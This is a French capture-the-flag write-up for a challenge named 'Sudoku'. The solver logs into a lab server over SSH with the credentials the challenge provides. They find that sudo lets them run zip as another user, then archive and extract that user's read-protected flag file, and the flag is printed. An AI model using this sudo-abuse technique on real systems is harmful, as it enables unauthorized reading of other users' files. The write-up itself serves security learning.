# Sudoku - 128 pts

Énoncé :

> Lors de l'un de vos tests de sécurité, vous compromettez un serveur applicatif. 
>  Prouvez à vos clients que vous pouvez obtenir des informations sensibles d'autres utilisateurs. 
>
>  === Connexion SSH ===
>  Login : `padawan`
>  Mdp :  `padawan`
>  Serveur :` sudoku.phack.fr`
>
>  Artiste : `@Eagleslam`



On se connecte en SSH à la machine indiqué et le message suivant apparaît :

```
 Bienvenue !

 Le flag se trouve dans /home/master/flag.txt
 Malheureusement, tu n'as pas les droits de le lire.

 Trouves un moyen d'y accéder par toi même.

 Bonne chance...
```

Nous avons un shell bash dans `/home/padawan/`. Un fichier `note.txt` se trouve dans notre home :

```
---------------------

Cher Padawan,

N'oublies pas de faire des sauvegardes régulières de tes documents personnels.
Le plus simple est de créer une archive (avec zip ou tar) je pense.

Bon courage,
Ton Master

---------------------
```

Le fichier `/home/master/flag.txt` a les permissions suivantes :

```
-r--------    1 master   root            30 Apr  1 22:56 flag.txt
```

Étant donné le nom du challenge, on va tout de suite s'intéresser à la commande `sudo` :

```
$ sudo -l
User padawan may run the following commands on sudoku:
    (master) NOPASSWD: /usr/bin/zip

```

Bingo ! L'utilisateur `padawan` peut utiliser la commande `zip` en tant que `master`.

```
$ cd /home/master/
$ ls
flag.txt
$ sudo -u master zip flag.zip flag.txt
  adding: flag.txt (stored 0%)
$ ls
flag.txt  flag.zip
$ cd
$ unzip ../master/flag.zip 
Archive:  ../master/flag.zip
 extracting: flag.txt                
$ ls
flag.txt    note.txt
$ cat flag.txt 
PHACK{U_h4v3_tH3_suP3r_P0w3r}
```

